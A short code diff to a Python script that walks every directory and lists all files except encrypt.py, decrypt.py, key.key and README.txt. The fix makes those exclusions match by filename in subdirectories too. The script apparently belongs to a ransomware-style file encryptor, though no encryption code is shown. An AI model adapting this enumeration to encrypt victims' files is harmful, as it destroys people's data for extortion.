@@ -8,7 +8,7 @@ for path, subdirs, files in os.walk("."):
     for name in files:
         strFile = str(os.path.join(path, name))
         if os.path.isfile(strFile):
-            if strFile == "./encrypt.py" or strFile == "./decrypt.py":
+            if name == "encrypt.py" or name == "decrypt.py":
                 continue
             else:
                 myFiles.append(strFile)
@@ -45,7 +45,7 @@ for path, subdirs, files in os.walk("."):
     for name in files:
         strFile = str(os.path.join(path, name))
         if os.path.isfile(strFile):
-            if strFile == "./encrypt.py" or strFile == "./decrypt.py" or strFile == "./key.key" or strFile == "./README.txt":
+            if name == "encrypt.py" or name == "decrypt.py" or name == "key.key" or name == "README.txt":
                 continue
             else:
                 myFiles.append(strFile)
